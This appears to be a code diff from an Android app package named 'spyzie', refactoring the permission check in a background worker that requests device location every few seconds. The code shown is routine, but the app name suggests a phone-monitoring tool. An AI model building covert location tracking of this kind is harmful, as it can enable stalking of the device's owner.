@@ -1,5 +1,6 @@
 package com.tantd.spyzie.data.device.worker;
 
+import android.Manifest;
 import android.content.Context;
 import android.location.Location;
 import android.os.Handler;
@@ -19,6 +20,9 @@ import com.google.android.gms.location.LocationServices;
 import com.tantd.spyzie.util.CommonUtils;
 import com.tantd.spyzie.util.Constants;
 
+/**
+ * Created by tantd on 2/26/2020.
+ */
 public class GetLocationWorker extends Worker {
 
     private static final int UPDATE_INTERVAL = 5 * 1000;
@@ -52,7 +56,7 @@ public class GetLocationWorker extends Worker {
         Log.d(Constants.LOG_TAG, "[GetLocationWorker] doWork, startValue=" + multiple + ", loop count=" + count);
 
 
-        if (!CommonUtils.checkPermissions(getApplicationContext())) {
+        if (!checkLocationPermissions()) {
             Log.d(Constants.LOG_TAG, "[GetLocationWorker] dont have location permission");
         } else if (!CommonUtils.isLocationTurnOn(getApplicationContext())) {
             Log.d(Constants.LOG_TAG, "[GetLocationWorker] location is turn off");
@@ -70,6 +74,11 @@ public class GetLocationWorker extends Worker {
         } catch (Exception e) {
             return Result.failure();
         }
+    }
+
+    private boolean checkLocationPermissions() {
+        return CommonUtils.hasPermissions(getApplicationContext(), new String[]{Manifest.permission.ACCESS_COARSE_LOCATION
+                , Manifest.permission.ACCESS_FINE_LOCATION});
     }
 
     private void requestNewLocationData() {
